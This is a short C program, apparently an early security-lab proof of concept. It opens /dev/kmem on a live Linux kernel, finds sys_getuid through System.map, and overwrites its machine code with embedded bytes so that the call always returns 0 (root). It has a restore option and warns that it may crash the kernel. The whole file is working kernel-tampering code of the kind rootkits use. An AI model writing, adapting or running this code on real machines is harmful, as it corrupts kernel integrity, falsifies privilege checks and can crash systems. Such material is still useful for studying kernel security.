/*
** main.c
**
** Made by (Guillaume PELAT)
** Login   <pelat_g@epita.fr>
**
** kernel live modification using kmem_mmap technique
**  This sample is supposed to modify current getuid() syscall
**  so that it always return zero.
**
** Greetings: Zorro <benoit.roussel@intexxia.com>,
**            Guitou <guillaume.thibaux@intexxia.com>
**            and everyone in intexxia lab.
*/

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>
#include <fcntl.h>
#include "symbol.h"
#include "kmem.h"
#include "main.h"

/* 
** sys_getuid() code - You may have to modify this 
**
** you can find sys_getuid() original code by doing 
** a objdump -D vmlinux | grep -n5 getuid 
*/
static char pattern[]="\xb8\x00\xe0\xff\xff\x21\xe0\x8b\x80\x30\x01\x00\x00\xc3";

/* New sys_getuid() returning always 0 - you may have to modify this too */
static char newcode[]="\xb8\x00\xe0\xff\xff\x21\xe0\x90\xb8\x00\x00\x00\x00\xc3";

void	usage(char *name)
{
  printf("Syntax: %s [System.map location]\n"
	 "  -f: force overwritting\n"
	 "  -r: restore\n"
	 "  -h: usage\n", name);
  exit(1);
}

int main(int ac, char **av)
{   
    int     kmem, force, restore;
    char    buf[BUFSIZ], c, *name;
    
    optarg = NULL;
	name = av[0];
    restore = force = 0;
    while ((c = getopt(ac, av, "frh")) > 0)
    {
	 switch (c) {
	   case 'f':
		   force = 1;
		   break;
	   case 'r':
		   restore = 1;
		   break;
	   case 'h':
		   usage(name);
		   break;
	 }
    }
    av += optind;
    ac -= optind;
    if (!ac)
      usage(name);
    printf("Loading symbols from %s...\n", av[0]);
    load_symbols(av[0]);
    printf("Opening /dev/kmem...\n");
    kmem = open_kmem();
    printf("Reading current sys_getuid code...\n");
    read_kmem(kmem, SYM("sys_getuid"), buf, 14);
    printf("Was expecting:\n");
    dump_data(restore?newcode:pattern, 14);

    if (!force && memcmp(buf, restore ? newcode : pattern, 14))
    {
        printf("Bad pattern found - Modify the pattern value or use -f option to force.\n");
        return 1;
    }
    printf("Replacing sys_getuid code by newcode - It may crash your kernel...\n");
	dump_data(restore?pattern:newcode, 14);
	write_kmem(kmem, SYM("sys_getuid"), restore ? pattern : newcode, 14);
    close(kmem);
    return 0;
}
